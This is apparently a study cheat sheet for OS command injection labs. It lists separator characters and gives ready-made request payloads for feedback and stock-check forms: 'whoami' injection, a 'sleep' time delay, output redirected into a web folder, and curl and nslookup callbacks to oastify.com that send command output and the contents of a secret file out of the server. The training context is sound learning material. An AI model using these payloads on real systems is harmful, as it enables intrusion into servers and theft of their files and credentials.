____

The place to find OS Injection is in **Submit Feedback** page, usually in email input, but, just in case, scan the other inputs too

```
 &&
 &
 ||
 |
 ;
 `
 '
 "
 0x0a
 \n
```


```bash
email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
```

```bash
||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
```

https://www.youtube.com/watch?v=o7oVWXw4t5E

# OS command injection, simple case

```bash
productId=3&storeId=1;whoami
```

# Blind OS command injection with time delays

```bash
csrf=MHUzDCRAmx3TG1QrDY2ZLHl2jHKiuHJg&name=test&email=test%40test.com||sleep+10||&subject=test&message=test
```

```bash
email=carlos@exam.net||curl+`whoami`.ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||
```

# Blind OS command injection with output redirection

```bash
csrf=hEZE4kGjoO0LidGJeSWj0GP6kZ6U8VlG&name=test&email=test%40test.com||whoami+>>+/var/www/images/test.txt||&subject=test&message=test
```

# Blind OS command injection with out-of-band interaction

```bash
csrf=JLmVMicftPWmhmy9AjLiFpbrbbTC5mQo&name=test&email=test%40test.com||nslookup+ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||&subject=test&message=test
```
## Blind OS command injection with out-of-band data exfiltration

```bash
csrf=tKGQKD6nVDuEr54nbuAfSdjsVrtIIK6N&name=test&email=test%40test.com||curl+`whoami`.z338sbcmd3onehr0t7l0b92ytpzfn4.oastify.com||&subject=test&message=test
```
